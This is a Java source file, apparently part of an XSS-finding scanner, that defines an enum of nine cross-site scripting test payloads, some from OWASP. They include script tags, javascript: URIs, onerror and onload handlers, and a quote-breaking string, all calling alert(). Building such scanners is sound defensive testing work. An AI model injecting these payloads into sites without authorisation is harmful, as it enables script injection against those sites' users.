package com.xss.finder.utils;

/**
 * Define the list of Payloads to check for XSS. Some payloads taken from OWASP
 * 
 * TODO: It should be good to use JBroFuzz:
 * 
 * @see https://www.owasp.org/index.php/Testing_for_Cross_site_scripting
 * @see https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors#Cross_Site_Scripting_.28XSS.29
 * @see https://www.owasp.org/index.php/OWASP_JBroFuzz_Tutorial
 * @see https://www.owasp.org/index.php/OWASP_JBroFuzz_Payloads_and_Fuzzers
 * 
 * @author <a href="mailto:jpperata@gmail.com">Juan Pablo Perata</a>
 */
public enum Payload {
	P_1("<script>alert(1);</script>"),

	P_2("<script type=\"text/vbscript\">alert(1)</script>"),

	P_3("<IMG SRC=\"javascript:alert('XSS');\">"),

	P_4("<IMG SRC=javascript:alert('XSS')>"),

	P_5("<IMG SRC=JaVaScRiPt:alert('XSS')>"),

	P_6("javascript:alert(\"XSS\")"),

	P_7("<img src=\"/\" onerror=\"javascript:alert('XSS');\">"),

	P_8("<BODY ONLOAD=alert('XSS')>"),

	P_9("';alert(1);//");

	String payload;

	Payload(String payload) {
		this.payload = payload;
	}

	public String getPlainValue() {
		return payload;
	}

	public String getEncodedValue() {
		return Utils.simpleWhitespaceEncoding(payload);
	}
}
